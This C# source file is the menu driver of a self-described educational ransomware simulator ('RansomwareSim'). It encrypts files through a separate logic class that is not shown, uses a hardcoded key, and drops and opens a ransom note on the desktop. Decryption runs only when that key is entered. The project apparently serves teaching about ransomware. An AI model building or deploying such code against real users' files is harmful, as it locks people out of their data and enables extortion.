using System;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace RansomwareSim
{
    internal class Program
    {
        public static bool DebugMode = false; // 🔧 Bandera de debug

        static string encryptionKey = "uYbVcXeZgUkXp2s5v8y/B?E(H+MbQeTh"; // Clave secreta fija

        static void Main(string[] args)
        {
            // Forzar UTF-8 para iconos
            Console.OutputEncoding = Encoding.UTF8;

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("=== 🛡 Ransomware Educativo ===");
            Console.ResetColor();

            // Comprobación de iconos
            try
            {
                Console.WriteLine("🛡 Iconos cargados correctamente ✅");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"⚠️ Error mostrando iconos: {ex.Message}");
                Console.ResetColor();
            }

            Console.WriteLine("1. Cifrar archivos");
            Console.WriteLine("2. Descifrar archivos");
            Console.Write("Elige una opción (1/2) o escribe 'debug' para activar modo debug: ");
            string choice = Console.ReadLine();

            // Activar modo debug
            if (choice.Equals("debug", StringComparison.OrdinalIgnoreCase))
            {
                DebugMode = true;
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("🔧 Modo debug activado.");
                Console.ResetColor();

                Console.Write("Elige una opción (1/2): ");
                choice = Console.ReadLine();
            }

            if (choice == "1")
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("🔒 Cifrando archivos...");
                Console.ResetColor();

                RansomwareLogic.EncryptFiles(encryptionKey);
                RansomwareLogic.CreateRansomNote();

                // Abrir nota en escritorio
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string readmePath = Path.Combine(desktop, "README_RESTORE_FILES.txt");
                if (File.Exists(readmePath))
                    Process.Start(new ProcessStartInfo(readmePath) { UseShellExecute = true });

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("✅ Archivos cifrados.");
                Console.ResetColor();
            }
            else if (choice == "2")
            {
                Console.Write("Introduce la clave para descifrar: ");
                string key = Console.ReadLine();

                if (key == encryptionKey)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("🔓 Descifrando archivos...");
                    Console.ResetColor();

                    RansomwareLogic.DecryptFiles(encryptionKey);

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("✅ Archivos descifrados.");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("❌ Clave incorrecta.");
                    Console.ResetColor();
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("❌ Opción no válida.");
                Console.ResetColor();
            }

            Console.WriteLine("Presiona cualquier tecla para salir...");
            Console.ReadKey();
        }
    }
}
